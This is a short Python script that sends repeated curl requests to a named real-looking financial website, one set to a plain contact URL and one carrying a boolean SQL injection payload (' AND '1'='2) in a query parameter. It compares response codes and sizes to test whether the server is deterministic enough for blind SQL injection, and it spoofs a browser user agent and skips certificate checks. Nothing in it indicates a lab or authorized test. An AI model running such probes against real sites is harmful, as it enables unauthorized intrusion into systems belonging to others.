import subprocess, time, os, uuid, collections

B = "https://www.infinitycapital.bh"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"

def probe(url):
    f = "/tmp/r_" + uuid.uuid4().hex[:8]
    p = subprocess.run(["curl","-sk","--max-time","30","-o",f,"-w","%{http_code}|%{size_download}",
                        "-A",UA,url], capture_output=True, text=True)
    b = open(f,"rb").read() if os.path.exists(f) else b""
    if os.path.exists(f): os.unlink(f)
    return p.stdout

# IDENTICAL payload repeated -> if the server is deterministic, all results must match
URL = B + "/contact?cb=1"
res = collections.Counter()
print("=== same URL x8 ===")
for i in range(8):
    r = probe(URL); res[r] += 1
    print("  ", r); time.sleep(4)
print("distribution:", dict(res))

res2 = collections.Counter()
print("=== same SQLi-False payload x6 ===")
URL2 = B + "/contact?cb=1%27%20AND%20%271%27=%272"
for i in range(6):
    r = probe(URL2); res2[r] += 1
    print("  ", r); time.sleep(4)
print("distribution:", dict(res2))
